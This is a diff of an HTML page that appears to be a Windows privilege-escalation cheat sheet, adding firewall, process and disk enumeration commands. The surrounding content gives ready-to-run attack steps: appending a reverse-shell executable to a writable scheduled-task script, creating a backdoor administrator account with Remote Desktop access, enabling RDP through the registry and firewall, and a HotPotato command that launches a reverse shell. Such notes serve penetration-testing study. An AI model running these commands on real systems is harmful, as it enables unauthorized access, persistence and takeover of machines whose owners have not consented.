@@ -95,7 +95,11 @@ net localgroup &lt;group?&gt;</code></pre><p id="defb30b1-24fc-4959-8c5b-e7142fe
 </p><p id="8a0b9de3-1662-4f8f-9a2f-5e6e25716a8e" class=""><strong>Firewall and AV Enumeration:</strong></p><p id="9da1f1c3-0881-469e-a442-0780ccf43016" class="">service control</p><pre id="c812f72e-b6c1-4b67-aaee-40c3ee574a11" class="code"><code>sc query windefend
 sc queryex type= service</code></pre><p id="2e2c8800-2601-4d1b-8fc9-2601c1631691" class="">Firewall settings:</p><pre id="b32efded-9d9b-4757-aed3-e459b38c720e" class="code"><code>netsh advfirewall firewall dump
 netsh firewall show state
-netsh firewall show config</code></pre><p id="93de35ca-3035-4dd4-8e6c-f9de104e75f6" class=""><strong><strong><strong><strong><strong><strong><strong><strong>Drivers:</strong></strong></strong></strong></strong></strong></strong></strong></p><pre id="602d6923-ffa8-4d06-a3ba-48f6a1769dd4" class="code"><code>driverquery /v
+netsh firewall show config
+#
+netsh advfirewall show currentprofile
+netsh advfirewall firewall show rule name=all</code></pre><p id="93de35ca-3035-4dd4-8e6c-f9de104e75f6" class=""><strong><strong><strong><strong><strong><strong><strong><strong>Drivers:</strong></strong></strong></strong></strong></strong></strong></strong></p><pre id="602d6923-ffa8-4d06-a3ba-48f6a1769dd4" class="code"><code>#powershell
+driverquery /v
 #Powershell
 powershell
 driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object‘Display Name’, ‘Start Mode’, Path
@@ -104,9 +108,8 @@ PS&gt; Get-ScheduledTask | where {$_.TaskPath -notlike &quot;\Microsoft*&quot;} 
 #Using accesschk.exe, note that you have the ability to write to this file:
 C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\task.ps1
 #Start a listener on Kali and then append a line to the C:\DevTools\task.ps1 which runs the reverse.exe executable you created:
-echo C:\PrivEsc\reverse.exe &gt;&gt; C:\DevTools\setup.ps1
-</code></pre><p id="546341a7-c3ca-456d-9bc4-535e0e027ab4" class="">
-</p><p id="99bbc802-f194-4e0b-90db-39ce0e06dd2d" class=""><strong>Insecure GUI Apps:</strong></p><pre id="639272a8-c0fa-4a98-a4c3-15fb9b255a6e" class="code"><code>tasklist /V | findstr &lt;task-run-by-admin&gt;</code></pre><p id="4a3e4686-e75a-4d94-a7fa-1b3b7f565a4e" class="">
+echo C:\PrivEsc\reverse.exe &gt;&gt; C:\DevTools\setup.ps1</code></pre><p id="546341a7-c3ca-456d-9bc4-535e0e027ab4" class=""><strong>Running processes &amp; services:</strong></p><pre id="449fe7b8-4de3-4b05-b4d8-d920ee8729c4" class="code"><code>tasklist /SVC</code></pre><p id="99bbc802-f194-4e0b-90db-39ce0e06dd2d" class=""><strong>Insecure GUI Apps:</strong></p><pre id="639272a8-c0fa-4a98-a4c3-15fb9b255a6e" class="code"><code>tasklist /V | findstr &lt;task-run-by-admin&gt;
+</code></pre><p id="4a3e4686-e75a-4d94-a7fa-1b3b7f565a4e" class="">
 </p><p id="436378b6-ed64-449c-a14d-4abca7341669" class=""><strong>Add user:</strong></p><pre id="a82198ea-45a7-49ff-b5bb-11ad3eb11e40" class="code"><code>net user test password123! /add
 net localgroup Administrators test /add
 net localgroup &quot;Remote Desktop Users&quot; test /add
@@ -126,10 +129,11 @@ reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDe
 netsh advfirewall firewall set rule group=&quot;remote desktop&quot; new enable=yes
 #Powershell
 Set-ItemProperty -Path &#x27;HKLM:\System\CurrentControlSet\Control\Terminal Server&#x27;-name &quot;fDenyTSConnections&quot; -Value 0
-Enable-NetFirewallRule -DisplayGroup &quot;Remote Desktop&quot;</code></pre><p id="89aada47-ed9b-48f6-96df-a334d0894fa0" class="">Using Remote Desktop:</p><pre id="003c60ec-b894-42ea-8d96-1ca4ae7059da" class="code"><code>xfreerdp /v:0.0.0.0 /u:Username /p:Password /cert:ignore /workarea
+Enable-NetFirewallRule -DisplayGroup &quot;Remote Desktop&quot;</code></pre><p id="89aada47-ed9b-48f6-96df-a334d0894fa0" class=""><strong>Using Remote Desktop:</strong></p><pre id="003c60ec-b894-42ea-8d96-1ca4ae7059da" class="code"><code>xfreerdp /v:0.0.0.0 /u:Username /p:Password /cert:ignore /workarea
 rdesktop 0.0.0.0 -u Username -p Password -d Domain.local
-</code></pre><p id="0375e7ea-7bfa-456c-a0c6-5c83414a079b" class="">HotPotato:</p><pre id="3fa06b32-f7a8-473a-a048-aa13c23e2890" class="code"><code>.\potato.exe -ip 0.0.0.0 -cmd &quot;C:\reverse.exe&quot; -enable_http server true -enable_defender true -enable_spoof true -enable_exhaust true</code></pre><p id="7dc31774-c491-44a5-a599-dcbdb6c3ae70" class="">
-</p></div></article></main></main>
+</code></pre><p id="0375e7ea-7bfa-456c-a0c6-5c83414a079b" class=""><strong>HotPotato:</strong></p><pre id="3fa06b32-f7a8-473a-a048-aa13c23e2890" class="code"><code>.\potato.exe -ip 0.0.0.0 -cmd &quot;C:\reverse.exe&quot; -enable_http server true -enable_defender true -enable_spoof true -enable_exhaust true</code></pre><p id="7dc31774-c491-44a5-a599-dcbdb6c3ae70" class="">
+</p><p id="ba92716f-ed02-452b-94cb-dd3c8f089038" class=""><strong>Unmounted Disks:</strong></p><pre id="f49aa6fa-f843-4531-8a11-e16f6b015185" class="code"><code>mountvol
+</code></pre></div></article></main></main>
 
     <!--==================== FOOTER ====================-->
     <footer class="footer">
